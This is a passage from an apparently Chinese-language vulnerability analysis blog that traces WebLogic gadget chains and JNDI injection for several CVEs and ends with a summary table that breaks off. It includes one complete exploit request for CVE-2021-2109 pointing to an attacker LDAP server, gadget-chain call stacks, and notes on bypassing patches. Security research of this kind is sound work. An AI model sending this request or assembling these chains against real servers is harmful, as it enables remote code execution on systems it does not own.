<h2 id="CVE-2021-2109"><a href="#CVE-2021-2109" class="headerlink" title="CVE-2021-2109"></a>CVE-2021-2109</h2><h3 id="分析-35"><a href="#分析-35" class="headerlink" title="分析"></a>分析</h3><p>JNDI注入漏洞，使用IDEA发包，请求包如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/console/css/%252e%252e%252f/consolejndi.portal</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>image/avif,image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.176.167:7001/console/css/%252e%252e%252f/consolejndi.portal</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>163</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">_pageLabel</span>=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%<span class="number">22</span>ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">176</span>;<span class="number">1</span>:<span class="number">1389</span>/ikun;AdminServer%<span class="number">22</span>)</span></span><br></pre></td></tr></table></figure>

<p>首先<code>_pageLabel</code>为JNDIBindingPageGeneral类型，定义该标签类型的xml文件如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291809034.png" alt="image-20230529180925919"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291808871.png" alt="image-20230529180831801"></p>
<p>JNDIBindingPageGeneral标签指向jndibinding.portlet文件。</p>
<p>查看jndibinding.portlet文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291811710.png" alt="image-20230529181117616"></p>
<p>发现它由JNDIBindingAction类进行处理。</p>
<p>然后在JNDIBindingAction的execute方法打断点：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291729115.png" alt="image-20230529172916992"></p>
<p>可以看到最后调用lookup发起JNDI查询，造成JNDI注入。</p>
<p>在中间，通过bindingHandle.getContext()获取context：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String context = bindingHandle.getContext();</span><br></pre></td></tr></table></figure>

<p>getContext方法体如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291733877.png" alt="image-20230529173340797"></p>
<p>然后进入getComponent方法查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291734180.png" alt="image-20230529173447077"></p>
<p>这里又调用了getComponents方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291737252.png" alt="image-20230529173722183"></p>
<p>先是通过getObjectIdentifier获取待处理字符串，然后创建字符串缓冲区currentComponent，最后进入for循环遍历字符串的每个字符。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291739428.png" alt="image-20230529173924325"></p>
<p>这个lastWasSpecial全程为false，所以从不会走if语句，第一个else if判断是否为反斜杆，很明显待处理的字符串<code>ldap://192.168.176;1:1389/ikun;AdminServer</code>不包含反斜杠。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291741293.png" alt="image-20230529174113219"></p>
<p>然后进入第二个else if判断是否为分号，若为分号则将currentComponent变成字符串加入componentList中，然后再将currentComponent置空。</p>
<p>最后else，则判断currentComponent是否为null，若为null则抛出异常，不为null，则将遍历的字符加入字符串缓冲区currentComponent中。</p>
<p>所以待处理的字符串<code>ldap://192.168.176;1:1389/ikun;AdminServer</code>，会这样处理：</p>
<ol>
<li>未遇到分号前，<code>ldap://192.168.176</code>依次存入currentComponent。</li>
<li>遇到第一个分号，currentComponent化成字符串存入componentList，然后字符串缓冲区currentComponent清空。这时componentList第一个元素为字符串<code>ldap://192.168.176</code>。</li>
<li>然后接着将<code>1:1389/ikun</code>中每个字符依次存入currentComponent。</li>
<li>遇到第二个分号，currentComponent化成字符串存入componentList，然后字符串缓冲区currentComponent清空。这时componentList第二个元素为字符串<code>1:1389/ikun</code>。</li>
<li>最后依次将<code>AdminServer</code>存入currentComponent，然后结束循环。</li>
<li>结束循环之后，将currentComponent转成字符串然后存入componentList，这时componentList第三个元素为<code>AdminServer</code>。然后将componentList转成字符串数组并赋给components属性。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291752425.png" alt="image-20230529175220355"></p>
<p>方法结束，返回components属性。</p>
<p>回到execute方法中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291756133.png" alt="image-20230529175618022"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String context = bindingHandle.getContext();</span><br><span class="line">String bindName = bindingHandle.getBinding();</span><br><span class="line">String serverName = bindingHandle.getServer();</span><br></pre></td></tr></table></figure>

<p>getContext()、getBinding()、getServer()分别返回components属性的前三个元素。即<code>ldap://192.168.176</code>、<code>1:1389/ikun</code>、<code>AdminServer</code>。</p>
<p>在execute方法体后面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291759662.png" alt="image-20230529175942500"></p>
<p>获取InitialContext，prefix设置为context（<code>ldap://192.168.176</code>）、suffix设置为bindName（<code>1:1389/ikun</code>），在prefix字符串末尾追加一个点号，然后将prefix和suffix拼接，作为lookup参数，发起JNDI查询。</p>
<h2 id="CVE-2021-2135"><a href="#CVE-2021-2135" class="headerlink" title="CVE-2021-2135"></a>CVE-2021-2135</h2><h3 id="分析-36"><a href="#分析-36" class="headerlink" title="分析"></a>分析</h3><p>利用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeHolder.readExternal()</span><br><span class="line"> ExternalizableHelper.readObject()</span><br><span class="line">  ExternalizableHelper.readObjectInternal()</span><br><span class="line">   ExternalizableHelper.readExternalizableLite()</span><br><span class="line">    ConditionalPutAll.readExternal()</span><br><span class="line">     ExternalizableHelper.readMap()</span><br><span class="line">      InflatableMap.put()</span><br><span class="line">       Objects.equals()</span><br><span class="line">        XString.equals()</span><br><span class="line">         SimpleBinaryEntry.toString()</span><br><span class="line">          SimpleBinaryEntry.getKey()</span><br><span class="line">           ExternalizableHelper.fromBinary()</span><br><span class="line">            ExternalizableHelper.deserializeInternal()</span><br><span class="line">             ExternalizableHelper.readObjectInternal()</span><br><span class="line">              ExternalizableHelper.readExternalizableLite()</span><br><span class="line">               PartialResult.readExternal()</span><br><span class="line">                PartialResult.add()</span><br><span class="line">                 SortedBag.add()</span><br><span class="line">                  TreeMap.put()</span><br><span class="line">                   TreeMap.compare()</span><br><span class="line">                    AbstractExtractor.compare()</span><br><span class="line">               	     MvelExtractor.extract()</span><br><span class="line">                      MVEL.executeExpression()</span><br></pre></td></tr></table></figure>

<p>利用CVE-2020-14756的AttributeHolder作为入口点，中间衔接了新的类ConditionalPutAll，接着使用了SimpleBinaryEntry，触发fromBinary，在deserializeInternal类新建输入流绕过黑名单限制，成功进到MvelExtractor.extract()进而表达式执行。</p>
<p>这里直接从ConditionalPutAll的readExternal方法开始：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301633229.png" alt="image-20230530163356870"></p>
<p>新建LiteMap实例，然后赋给m_map属性以及临时变量map，然后调用readMap方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301635099.png" alt="image-20230530163545975"></p>
<p>LiteMap没有put方法，所以由它的父类InflatableMap执行put方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301638441.png" alt="image-20230530163833329"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301639783.png" alt="image-20230530163927670"></p>
<p>来到XString的equals方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301641482.png" alt="image-20230530164131374"></p>
<p>接着来到SimpleBinaryEntry的toString方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301643561.png" alt="image-20230530164347443"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301644633.png" alt="image-20230530164400558"></p>
<p>这里m_key属性必为null，因为它是transient修饰的。m_binKey不为transient且在readExternal时已经赋上了值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301645893.png" alt="image-20230530164500761"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301646300.png" alt="image-20230530164630166"></p>
<p>在deserializeInternal中有个重点，他从缓冲区中获取流，该输入流是没有黑名单拦截的。nType不为21，所以调用readObjectInternal方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301656290.png" alt="image-20230530165652190"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301657279.png" alt="image-20230530165718163"></p>
<p>后续是CVE-2020-14756的利用链后半部分，最终执行表达式。</p>
<h3 id="重大修复"><a href="#重大修复" class="headerlink" title="重大修复"></a>重大修复</h3><p>在InboundMsgAbbrev新增了一个白名单字段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Class[] ABBREV_CLASSES = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">    String.class, </span><br><span class="line">    ServiceContext.class, </span><br><span class="line">    ClassTableEntry.class, </span><br><span class="line">    JVMID.class, </span><br><span class="line">    AuthenticatedUser.class, </span><br><span class="line">    RuntimeMethodDescriptor.class, </span><br><span class="line">    Immutable.class</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>同时在该类的readObject方法里将白名单字段ABBREV_CLASSES传入readObjectValidated方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305302038315.png" alt="image-20230530203822122"></p>
<p>readObjectValidated方法体如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305302046206.png" alt="image-20230530204627099"></p>
<p>接着将白名单传递给FilteringObjectInputStream的expectedTypes属性，然后调用readObject方法反序列化。</p>
<p>在反序列化时，会调用ServerChannelInputStream的resolveClass来链接类（如下）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305302050488.png" alt="image-20230530205026535"></p>
<p>这里先调用checkLegacyBlacklistIfNeeded检测类名是否在黑名单，然后调用父类的resolveClass方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305302054450.png" alt="image-20230530205401344"></p>
<p>父类FilteringObjectInputStream再调用父类的resolveClass链接类，找到类之后，调用validateReturnType方法（如下）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305302055553.png" alt="image-20230530205546405"></p>
<p>判断反序列化的类是否为白名单中的类的子类，如果是，则放行。</p>
<h2 id="CVE-2021-2294"><a href="#CVE-2021-2294" class="headerlink" title="CVE-2021-2294"></a>CVE-2021-2294</h2><h3 id="分析-37"><a href="#分析-37" class="headerlink" title="分析"></a>分析</h3><p>漏洞的影响仅限于往可控地址发送JDBC请求。</p>
<p>在OraclePooledConnection的readObject方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306021857636.png" alt="image-20230602185743311"></p>
<p>后续就是发起JDBC请求的细节了，与常规JDBC反序列化漏洞相比，WebLogic中发起JDBC请求之后并没有反序列化的步骤。</p>
<h2 id="CVE-2021-2394"><a href="#CVE-2021-2394" class="headerlink" title="CVE-2021-2394"></a>CVE-2021-2394</h2><h3 id="分析-38"><a href="#分析-38" class="headerlink" title="分析"></a>分析</h3><p>通过JNDI注入进行RCE，利用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeHolder.readExternal()</span><br><span class="line"> ExternalizableHelper.readObject()</span><br><span class="line">  ExternalizableHelper.readObjectInternal()</span><br><span class="line">   ExternalizableHelper.readExternalizableLite()</span><br><span class="line">    PartialResult.readExternal()</span><br><span class="line">     ExternalizableHelper.readObject() </span><br><span class="line">      FilterExtractor.readExternal()</span><br><span class="line">       FilterExtractor.readAttributeAccessor()</span><br><span class="line">     PartialResult.add()</span><br><span class="line">      SortedBag.add()</span><br><span class="line">       TreeMap.put()</span><br><span class="line">        WrapperComparator.compare()</span><br><span class="line">         AbstractExtractor.compare()</span><br><span class="line">          FilterExtractor.compare()</span><br><span class="line">           FilterExtractor.extract()</span><br><span class="line">            MethodAttributeAccessor.getAttributeValueFromObject()</span><br><span class="line">             Method.invoke()</span><br><span class="line">              JdbcRowSetImpl.getDatabaseMetaData()</span><br></pre></td></tr></table></figure>

<p>前半部分由CVE-2020-14756组成，从PartialResult.readExternal()方法开始：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306032051487.png" alt="image-20230603205140411"></p>
<p>这里先反序列化FilterExtractor，会来到该类的readExternal进行反序列化：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306032021613.png" alt="image-20230603202159182"></p>
<p>调用SerializationHelper.readAttributeAccessor(in);然后将返回值，赋给attributeAccessor属性。点进去查看该方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306032023893.png" alt="image-20230603202318666"></p>
<p>新建MethodAttributeAccessor，设置属性名、getter方法名、setter方法名，然后将其返回。</p>
<p>回到PartialResult.readExternal()方法，第二次反序列化JdbcRowSetImpl，然后调用add方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306032043965.png" alt="image-20230603204340895"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181409986.png" alt="image-20230518140902907"></p>
<p>接着调用put方法将JdbcRowSetImpl实例作为第一个参数：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181411132.png" alt="image-20230518141153065"></p>
<p>省略WrapperComparator.compare()，来到AbstractExtractor.compare()：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181417693.png" alt="image-20230518141730632"></p>
<p>这里调用子类FilterExtractor的extract方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306032044292.png" alt="image-20230603204442217"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171617427.png" alt="image-20230517161731330"></p>
<p>反射调用JdbcRowSetImpl的getDatabaseMetaData方法，后面就是经典JNDI注入了。</p>
<h2 id="CVE-2022-21350"><a href="#CVE-2022-21350" class="headerlink" title="CVE-2022-21350"></a>CVE-2022-21350</h2><h3 id="分析-39"><a href="#分析-39" class="headerlink" title="分析"></a>分析</h3><p>这是一条全新的利用链，通过JNDI进行RCE。</p>
<p>这里官网写的是T3的反序列化漏洞，但是在2021年4月的补丁已经为T3设置了白名单，而该漏洞是晚于4月的，所以T3是打不了的，官网也不知道为啥写了T3，而且很多人的分析文章也没有提及白名单这回事，估计根本没复现或者说根本就没打补丁所以不知道这回事。</p>
<p>利用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line"> SessionData.toString()</span><br><span class="line">  SessionData.isDebuggingSession()</span><br><span class="line">   SessionData.getAttribute()</span><br><span class="line">    SessionData.getAttributeInternal()</span><br><span class="line">     AttributeWrapperUtils.unwrapObject()</span><br><span class="line">      AttributeWrapperUtils.unwrapEJBObjects()</span><br><span class="line">       BusinessHandleImpl.getBusinessObject()</span><br><span class="line">        HomeHandleImpl.getEJBHome()</span><br><span class="line">         Context.lookup()</span><br></pre></td></tr></table></figure>

<p>从BadAttributeValueExpException.readObject()进行查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041541694.png" alt="image-20230604154145320"></p>
<p>由这里进入SessionData的toString方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041547624.png" alt="image-20230604154759521"></p>
<p>进入isDebuggingSession方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041548798.png" alt="image-20230604154823732"></p>
<p>调用getAttribute方法，传递字符串<code>wl_debug_session</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041549967.png" alt="image-20230604154906868"></p>
<p>getSecurityModuleAttribute方法返回null，接着进入getAttributeInternal方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041549597.png" alt="image-20230604154959482"></p>
<p>attributes属性为map，这里从map中取字符串<code>wl_debug_session</code>对应的Object，将Object强转为AttributeWrapper类型，然后将其作为调用unwrapObject方法的第二个参数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041551036.png" alt="image-20230604155111940"></p>
<p>unwrapObject方法里，先通过getObject取Object，然后判断该Object是否为EJB包装对象，是的话调用unwrapEJBObjects方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041551859.png" alt="image-20230604155144751"></p>
<p>接着进入getBusinessObject方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041552361.png" alt="image-20230604155223289"></p>
<p>两个属性businessObject和primaryKey都为null，进入getEJBHome方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306041552467.png" alt="image-20230604155254369"></p>
<p>在getEJBHome方法中，通过可控的注册中心地址this.serverURL获取上下文，然后又通过该上下文将可控的查询名this.jndiName作为参数进行JNDI查询，造成JNDI注入。</p>
<h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><h3 id="分析-40"><a href="#分析-40" class="headerlink" title="分析"></a>分析</h3><p>该漏洞的原理为：</p>
<ol>
<li>客户端先使用rebind操作，去绑定一个对象到服务端中；</li>
<li>然后客户端使用lookup操作，请求服务端，查找刚刚绑定的对象；</li>
<li>服务端接受到lookup请求，在查找该名称对应的对象时，会判断该对象是否为OpaqueReference接口的实例，若是，则调用该对象的getReferent方法。</li>
</ol>
<p>接着看一下lookup请求对应的利用链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getReferent:74, ForeignOpaqueReference (weblogic.jndi.internal) &lt;------</span><br><span class="line">getObjectInstance:106, WLNamingManager (weblogic.jndi.internal) &lt;------</span><br><span class="line">resolveObject:1037, BasicNamingNode (weblogic.jndi.internal)</span><br><span class="line">resolveObject:1009, BasicNamingNode (weblogic.jndi.internal)  </span><br><span class="line">lookupSharable:1578, BasicNamingNode (weblogic.jndi.internal) &lt;------</span><br><span class="line">lookupSharable:47, PartitionHandler (weblogic.jndi.internal)</span><br><span class="line">lookup:536, ServerNamingNode (weblogic.jndi.internal)</span><br><span class="line">lookup:84, RootNamingNode (weblogic.jndi.internal)</span><br><span class="line">lookup:307, WLEventContextImpl (weblogic.jndi.internal)</span><br><span class="line">lookup:435, WLContextImpl (weblogic.jndi.internal)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">resolveObject:461, NamingContextImpl (weblogic.corba.cos.naming)</span><br><span class="line">resolve_any:368, NamingContextImpl (weblogic.corba.cos.naming)</span><br><span class="line">_invoke:114, _NamingContextAnyImplBase (weblogic.corba.cos.naming) &lt;------</span><br><span class="line">invoke:249, CorbaServerRef (weblogic.corba.idl)</span><br><span class="line">invoke:246, ClusterableServerRef (weblogic.rmi.cluster)</span><br><span class="line">run:534, BasicServerRef$2 (weblogic.rmi.internal)</span><br><span class="line">doAs:386, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:163, SecurityManager (weblogic.security.service)</span><br><span class="line">handleRequest:531, BasicServerRef (weblogic.rmi.internal)</span><br><span class="line">run:138, WLSExecuteRequest (weblogic.rmi.internal.wls)</span><br><span class="line">_runAs:352, ComponentInvocationContextManager (weblogic.invocation)</span><br><span class="line">runAs:337, ComponentInvocationContextManager (weblogic.invocation)</span><br><span class="line">doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work)</span><br><span class="line">runWorkUnderContext:41, PartitionUtility (weblogic.work)</span><br><span class="line">runWorkUnderContext:655, SelfTuningWorkManagerImpl (weblogic.work)</span><br><span class="line">execute:420, ExecuteThread (weblogic.work)</span><br><span class="line">run:360, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>

<p>这里只看标了&lt;——的地方，首先是NamingContextAnyImplBase._invoke：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306051637584.png" alt="image-20230605163717502"></p>
<p>方法体根据不同类型进行不同操作，lookup请求对应的类型为2，进行的操作为resolve_any。</p>
<p>然后来到BasicNamingNode的lookupSharable方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306051615972.png" alt="image-20230605161516840"></p>
<p>在rebind操作中，已经提前将名称和对象存入了缓存map中，这里调用lookupHere方法就是从map中根据名称查找对象，lookupHere方法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306051615079.png" alt="image-20230605161540973"></p>
<p>在BasicNamingNode的lookupSharable方法中（如下），调用完lookupHere后调用resolveObject方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306051615972.png" alt="image-20230605161516840"></p>
<p>resolveObject就不展示了，因为没有太大意义，根据利用链，来到WLNamingManager的getObjectInstance方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306051551904.png" alt="image-20230605155124563"></p>
<p>在这里判断对象是否为OpaqueReference的实例，是的话则调用getReferent方法。</p>
<p>OpaqueReference为接口，它的实现类巨多，其中有一个实现类叫ForeignOpaqueReference类，该类的getReferent方法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306051552096.png" alt="image-20230605155203001"></p>
<p>会根据remoteJNDIName属性的值去进行lookup，造成JNDI注入。</p>
<h2 id="CVE-2023-21931"><a href="#CVE-2023-21931" class="headerlink" title="CVE-2023-21931"></a>CVE-2023-21931</h2><h3 id="分析-41"><a href="#分析-41" class="headerlink" title="分析"></a>分析</h3><p>该漏洞与上一个漏洞相似，也是先rebind，再lookup，只是rebind的对象类型不同。</p>
<p>不同点位于WLNamingManager的getObjectInstance方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306051702526.png" alt="image-20230605170225433"></p>
<p>这里绑定的对象若为LinkRef的实例的话，会从绑定的对象中获取字符串，然后再使用该字符串进行lookup，造成JNDI注入。</p>
<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>在2023年爆出的两个高危漏洞CVE-2023-21839和CVE-2023-21931能反序列化成功且进行rebind操作，原因就是他们走的是IIOP的反序列化链，IIOP没有白名单，只有黑名单，而ForeignOpaqueReference不在黑名单。</p>
<p>截至到目前2023&#x2F;06&#x2F;08，T3协议是已经加了白名单的了，而IIOP依旧是使用黑名单。所以说未来的漏洞应该是偏向于IIOP反序列化攻击，因为T3的白名单绕过麻烦，且难绕。</p>
<p>WebLogic的漏洞挖掘应在以下两个方面：</p>
<ol>
<li>通过WebLogic自带的特性寻找漏洞，某些URI可能存在漏洞；</li>
<li>挖掘IIOP反序列化新链；</li>
</ol>
<p>二次反序列化已经行不通了，因为WebLogic已经通过JDK JEP290的特性注册了自己的输入流过滤器，即使是创建原生的ObjectInputStream，也会走黑名单。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>WebLogic从诞生之初就有各种各样的漏洞，按漏洞类型分类的话如下：</p>
<ul>
<li>反序列化漏洞：CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2017-3506、CVE-2017-10271、CVE-2018-2628、CVE-2018-2893、CVE-2018-3191、CVE-2018-3245、CVE-2018-3252、CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650、CVE-2019-2888、CVE-2019-2725、CVE-2019-2729、CVE-2019-2890、CVE-2020-2551、CVE-2020-2555、CVE-2020-2883、CVE-2020-2963、CVE-2020-14644、CVE-2020-14645、CVE-2020-14756、CVE-2020-14825&#x2F;CVE-2020-14841、CVE-2021-2135、CVE-2021-2394、CVE-2022-21350</li>
<li>文件上传漏洞：CVE-2018-2894、CVE-2019-2618</li>
<li>外部实体注入漏洞：CVE-2018-3246</li>
<li>任意文件读取漏洞：CVE-2019-2615</li>
<li>未授权访问漏洞：CVE-2020-14750、CVE-2020-14882</li>
<li>任意命令执行漏洞：CVE-2020-14883</li>
<li>JNDI注入漏洞：CVE-2021-2109、、CVE-2023-21839、CVE-2023-21931</li>
<li>目录穿越漏洞：CVE-2019-2827</li>
</ul>
<p>反序列化又可以分类成T3协议反序列化、IIOP协议反序列化、XMLDecoder反序列化；</p>
<p>接下来以一个表格来归纳所有漏洞：</p>
<table>
<thead>
<tr>
<th>CVE</th>
<th>分类</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>CVE-2015-4852</td>
<td>T3协议反序列化漏洞</td>
<td>在InboundMsgAbbrev#readObject处理待反序列化对象，无任何限制，配合CC链直接反序列化造成RCE。</td>
</tr>
<tr>
<td>CVE-2016-0638</td>
<td>T3协议反序列化漏洞</td>
<td>在StreamMessageImpl的readExternal方法中会创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用这个特性绕过黑名单，配合CC链造成RCE。</td>
</tr>
<tr>
<td>CVE-2016-3510</td>
<td>T3协议反序列化漏洞</td>
<td>在MarshalledObject的readResolve方法会创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用这个特性绕过黑名单，配合CC链造成RCE。</td>
</tr>
<tr>
<td>CVE-2017-3248</td>
<td>T3协议反序列化漏洞</td>
<td>RemoteObject的readObject方法的后续操作会发送JRMP请求向指定服务端，可以伪造服务端返回一个CC链封装的恶意对象，造成RCE。</td>
</tr>
<tr>
<td>CVE-2017-3506</td>
<td>XMLDecoder反序列化漏洞</td>
<td>未对标签做任何限制，使用自定义的XML，反序列化后直接执行命令。</td>
</tr>
<tr>
<td>CVE-2017-10271</td>
<td>XMLDecoder反序列化漏洞</td>
<td>封禁object标签，可以使用void标签代替来绕过。使用替换后的XML，反序列化后直接执行命令。</td>
</tr>
<tr>
<td>CVE-2018-2628</td>
<td>T3协议反序列化漏洞</td>
<td>该CVE包含两个漏洞，第一个是使用Activator作为动态代理的接口，配合RemoteObject的readObject向指定JRMP服务端发送请求。第二个是使用StreamMessageImpl绕过黑名单，反序列化DiskFileItem类，配合JDK6空字符截断的特性，写入WebShell。</td>
</tr>
<tr>
<td>CVE-2018-2893</td>
<td>T3协议反序列化漏洞</td>
<td>使用StreamMessageImpl绕过黑名单，反序列化动态代理类，配合RemoteObject的readObject向指定JRMP服务端发送请求。</td>
</tr>
<tr>
<td>CVE-2018-2894</td>
<td>文件上传漏洞</td>
<td>&#x2F;ws_utc&#x2F;config.do和&#x2F;ws_utc&#x2F;begin.do两处URI可未授权直接上传文件。</td>
</tr>
<tr>
<td>CVE-2018-3191</td>
<td>T3协议反序列化漏洞</td>
<td>直接反序列化JtaTransactionManager，造成JNDI注入。</td>
</tr>
<tr>
<td>CVE-2018-3245</td>
<td>T3协议反序列化漏洞</td>
<td>RemoteObject的readObject方法的后续操作会发送JRMP请求向指定服务端，可以伪造服务端返回一个CC链封装的恶意对象，造成RCE。</td>
</tr>
<tr>
<td>CVE-2018-3246</td>
<td>外部实体注入漏洞</td>
<td>基于文件上传点&#x2F;ws_utc&#x2F;begin.do，上传包含外部实体的XML文件造成XXE。</td>
</tr>
<tr>
<td>CVE-2018-3252</td>
<td>反序列化漏洞</td>
<td>URI为&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService，会根据请求头类型wl_request_type: data_transfer_request，自动将请求体的内容进行反序列化。反序列化的流为DeploymentObjectInputStream，没有黑名单。</td>
</tr>
<tr>
<td>CVE-2019-2615</td>
<td>任意文件读取漏洞</td>
<td>URI为&#x2F;bea_wls_management_internal2&#x2F;wl_management，根据adminPath所指定的路径读取系统文件并返回。</td>
</tr>
<tr>
<td>CVE-2019-2618</td>
<td>文件上传漏洞</td>
<td>URI为&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService，将请求体的内容上传到临时目录下。</td>
</tr>
<tr>
<td>CVE-2019-2647<br />~<br />CVE-2019-2888</td>
<td>T3协议反序列化漏洞</td>
